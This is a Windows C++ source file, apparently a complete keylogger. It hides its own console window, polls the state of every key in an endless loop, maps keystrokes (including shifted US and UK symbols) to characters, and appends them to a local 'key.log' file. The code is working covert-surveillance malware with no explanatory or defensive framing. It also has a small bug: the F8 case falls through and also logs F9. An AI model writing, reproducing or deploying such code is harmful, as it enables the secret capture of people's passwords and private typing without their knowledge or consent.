#include "windows.h"
#include "iostream"
#include "fstream"
#include "string"
using namespace std;

void log(string key){

    fstream logfile;
    logfile.open("key.log", ios::app); //create a log file//
    if(logfile.is_open()){
        logfile << key; //write key into log file//
        logfile.close();  //close it //
    }
}
char special(int key, bool capstate){ //determine key//
    switch(key){
        case VK_BACK:
            return '\b';
        case VK_ESCAPE:
            log("(ESC)");
            return ' ';
        case VK_SPACE:
            return ' ';
        case VK_CONTROL:
            log("(CTRL)");
            return ' ';
        case VK_TAB:
            log("(TAB)");
            return ' ';
        case VK_LWIN:
            log("(WIN)");
            return ' ';
        case VK_RWIN:
            log("(WIN)");
            return ' ';
        case VK_MENU:
            log("(ALT)");
            return ' ';    
        case VK_APPS:
            log("(APPS)");
            return ' ';
        case VK_RETURN:
            return '\n';     
        case VK_SHIFT:
            return ' '; 
        case VK_CAPITAL:
            return ' ';
        case VK_F1:
            log("(F1)");
            return ' ';
        case VK_F2:
            log("(F2)");
            return ' ';
        case VK_F3:
            log("(F3)");
            return ' ';
        case VK_F4:
            log("(F4)");
            return ' ';
        case VK_F5:
            log("(F5)");
            return ' ';
        case VK_F6:
            log("(F6)");
            return ' ';
        case VK_F7:
            log("(F7)");
            return ' ';
        case VK_F8:
            log("(F8)");
        case VK_F9:
            log("(F9)");
            return ' ';
        case VK_F10:
            log("(F10)");
            return ' ';
        case VK_F11:
            log("(F11)");
            return ' ';
        case VK_F12:
            log("(F12)");
            return ' ';
        case VK_OEM_1:
            return ';';
        case VK_OEM_2:
            return '/';
        case VK_OEM_3:
            return '`';
        case VK_OEM_4:
            return '[';
        case VK_OEM_5:
            return '\\';
        case VK_OEM_6:
            return ']';
        case VK_OEM_7:
            return '\'';
        case VK_OEM_PLUS:
            return '=';
        case VK_OEM_COMMA:
            return ',';
        case VK_OEM_MINUS:
            return '-';
        case VK_OEM_PERIOD:
         return '.';
        default:
            if(capstate){ //if caplock , return uppercase//
                return (char)key;
            }else{
                return (char)tolower(key); //lowercase it //
            }
    }
}
char shift(int key, bool uslayout){ //determine key after shifted//
    if(uslayout){ //us layout is different with uk layout//
        switch(key){
        case VK_SHIFT:
            return ' ';
        case (int)'1':
            return '!';
        case (int)'2':
            return '@';
        case (int)'3':
            return '#';
        case (int)'4':
            return '$';
        case (int)'5':
            return '%';
        case (int)'6':
            return '^';
        case (int)'7':
            return '&';
        case (int)'8':
            return '*';
        case (int)'9':
            return '(';
        case (int)'0':
            return ')';
        case VK_OEM_1:
            return ':';
        case VK_OEM_2:
            return '?';
        case VK_OEM_3:
            return '~';
        case VK_OEM_4:
            return '{';
        case VK_OEM_5:
            return '|';
        case VK_OEM_6:
            return '}';
        case VK_OEM_7:
            return '"';
        case VK_OEM_PLUS:
            return '+';
        case VK_OEM_COMMA:
            return '<';
        case VK_OEM_MINUS:
            return '_';
        case VK_OEM_PERIOD:
            return '>';
        
        default:
            return special(key, TRUE);    
    }
    }else{ //determine uk layout(not done yet)//
        switch(key){
        case VK_SHIFT:
            return ' ';
        case (int)'1':
            return '!';
        case (int)'2':
            return '"';
        case (int)'3':
            return '£';
        case (int)'4':
            return '$';
        case (int)'5':
            return '%';
        case (int)'6':
            return '^';
        case (int)'7':
            return '&';
        case (int)'8':
            return '*';
        case (int)'9':
            return '(';
        case (int)'0':
            return ')';
        case VK_OEM_1:
            return ':';
        case VK_OEM_2:
            return '?';
        case VK_OEM_3:
            return '¬';
        case VK_OEM_4:
            return '{';
        case VK_OEM_5:
            return '~';
        case VK_OEM_6:
            return '}';
        case VK_OEM_7:
            return '@';
        case VK_OEM_PLUS:
            return '+';
        case VK_OEM_COMMA:
            return '<';
        case VK_OEM_MINUS:
            return '_';
        case VK_OEM_PERIOD:
            return '>';
        
        default:
            return special(key, TRUE);    
    }
    }
}

int main(){
    bool uslayout = 1; //boolean uslayout//
    HKL name = GetKeyboardLayout(GetCurrentThreadId()); //get keyboard layout id//
    if(name == (HKL)0x8090809){ //if uk layout id, uslayout =0//
        uslayout = 0;
    }else{
        uslayout = 1;
    }
    ShowWindow(GetConsoleWindow(), SW_HIDE); //show window and hide it//
    char KEY = 'x';
    bool keystate = 0; //shift boolean//
    bool capstate = 0; //caplock boolean//
    string key;
    while(TRUE){ //loop//
        for(int KEY=8; KEY<=255; KEY++){ //change key ascll code to fit key input//
            if(GetKeyState(VK_SHIFT) & 0x8000 ){ //if shift pressed//
                keystate = 1;
            }else {
                keystate = 0;
            }
            if(GetAsyncKeyState(KEY) == -32767){ //finally find fit ascll code//
                if(KEY == VK_CAPITAL){ //if caplock pressed//
                    if(capstate){
                        capstate = 0;
                        
                    }else{
                        capstate = 1;
                       
                    }
                }
                if(keystate){
                        key = shift(KEY, uslayout); //do shift key if shift pressed//
                }else{
                        key = special(KEY, capstate); //normal output//
                }
                
                log(key); //call log to write key//
            }
        }
    }
}
